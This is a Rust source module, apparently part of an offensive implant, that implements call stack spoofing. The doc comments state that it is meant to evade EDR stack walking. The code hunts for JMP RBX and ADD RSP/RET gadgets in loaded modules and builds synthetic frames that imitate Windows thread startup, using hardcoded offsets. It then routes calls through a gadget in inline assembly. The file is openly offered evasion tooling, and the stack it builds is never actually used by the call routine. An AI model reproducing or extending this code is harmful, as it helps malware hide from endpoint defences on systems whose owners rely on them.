#![allow(non_snake_case)]
#![allow(dead_code)]

//! # Call Stack Spoofing (Synthetic Frames)
//!
//! Creates fake call frames to evade EDR stack walking.
//! Makes syscalls appear to come from legitimate code paths.
//!
//! ## Goal
//! Replace: [Private Memory] → ntdll
//! With:    kernel32!BaseThreadInitThunk → ntdll!RtlUserThreadStart

use std::ffi::c_void;
use log::debug;

// ============================================================================
// STACK FRAME
// ============================================================================

/// Represents a synthetic stack frame
#[repr(C)]
pub struct SyntheticFrame {
    pub return_address: *const c_void,
    pub saved_rbp: usize,
}

// ============================================================================
// GADGET HUNTING
// ============================================================================

/// Find a `JMP RBX` gadget in module (0xFF 0xE3)
pub unsafe fn find_jmp_rbx_gadget(module_base: *const c_void) -> Option<*const c_void> {
    find_gadget(module_base, &[0xFF, 0xE3])
}

/// Find an `ADD RSP, offset; RET` gadget
pub unsafe fn find_add_rsp_ret_gadget(module_base: *const c_void, offset: u8) -> Option<*const c_void> {
    // ADD RSP, X = 48 83 C4 XX
    // RET = C3
    find_gadget(module_base, &[0x48, 0x83, 0xC4, offset, 0xC3])
}

/// Find gadget pattern in module
unsafe fn find_gadget(module_base: *const c_void, pattern: &[u8]) -> Option<*const c_void> {
    let dos = module_base as *const u16;
    if *dos != 0x5A4D { return None; }
    
    let e_lfanew = *((module_base as usize + 0x3C) as *const i32);
    let nt = (module_base as usize + e_lfanew as usize) as *const u8;
    let size_of_image = *((nt as usize + 0x50) as *const u32) as usize;
    
    let base = module_base as *const u8;
    for i in 0..size_of_image.saturating_sub(pattern.len()) {
        let mut found = true;
        for (j, &b) in pattern.iter().enumerate() {
            if *base.add(i + j) != b {
                found = false;
                break;
            }
        }
        if found {
            return Some(base.add(i) as *const c_void);
        }
    }
    None
}

// ============================================================================
// SYNTHETIC STACK BUILDER
// ============================================================================

/// Stack buffer for spoofing
#[repr(C)]
pub struct SpoofedStack {
    buffer: [u8; 256],
    pub new_rsp: *mut c_void,
}

impl SpoofedStack {
    /// Build a fake call stack mimicking Windows thread startup
    pub unsafe fn new(
        real_return: *const c_void,
        kernel32_base: *const c_void,
        ntdll_base: *const c_void,
    ) -> Option<Self> {
        let mut stack = Self {
            buffer: [0; 256],
            new_rsp: std::ptr::null_mut(),
        };
        
        // Example offsets (vary by Windows version)
        // In production: resolve dynamically via export parsing
        let base_thread_init = (kernel32_base as usize + 0x17974) as *const c_void;
        let rtl_user_thread_start = (ntdll_base as usize + 0x526F0) as *const c_void;
        
        // Build fake stack (grows downward)
        let frame_ptr = stack.buffer.as_mut_ptr().add(256) as *mut usize;
        
        *frame_ptr.sub(1) = real_return as usize;
        *frame_ptr.sub(2) = base_thread_init as usize;
        *frame_ptr.sub(3) = rtl_user_thread_start as usize;
        *frame_ptr.sub(4) = 0; // Saved RBP
        
        stack.new_rsp = frame_ptr.sub(4) as *mut c_void;
        
        Some(stack)
    }
}

// ============================================================================
// SPOOFED CALL EXECUTOR
// ============================================================================

/// Execute a function with spoofed call stack
#[cfg(target_arch = "x86_64")]
pub unsafe fn spoofed_call(
    target: *const c_void,
    jmp_rbx_gadget: *const c_void,
    args: &[usize],
) -> usize {
    let result: usize;
    
    let a1 = args.get(0).copied().unwrap_or(0);
    let a2 = args.get(1).copied().unwrap_or(0);
    let a3 = args.get(2).copied().unwrap_or(0);
    let a4 = args.get(3).copied().unwrap_or(0);
    
    std::arch::asm!(
        // Save callee-saved register
        "push rbx",
        
        // RBX = target function
        "mov rbx, {target}",
        
        // Set up args
        "mov rcx, {a1}",
        "mov rdx, {a2}",
        "mov r8, {a3}",
        "mov r9, {a4}",
        
        // Shadow space
        "sub rsp, 32",
        
        // Call via gadget (JMP RBX inside ntdll/kernel32)
        "call {gadget}",
        
        // Cleanup
        "add rsp, 32",
        "pop rbx",
        
        target = in(reg) target,
        gadget = in(reg) jmp_rbx_gadget,
        a1 = in(reg) a1,
        a2 = in(reg) a2,
        a3 = in(reg) a3,
        a4 = in(reg) a4,
        lateout("rax") result,
        clobber_abi("system"),
    );
    
    debug!("[StackSpoof] Call completed, result: 0x{:X}", result);
    result
}

#[cfg(not(target_arch = "x86_64"))]
pub unsafe fn spoofed_call(
    _target: *const c_void,
    _jmp_rbx_gadget: *const c_void,
    _args: &[usize],
) -> usize {
    0
}
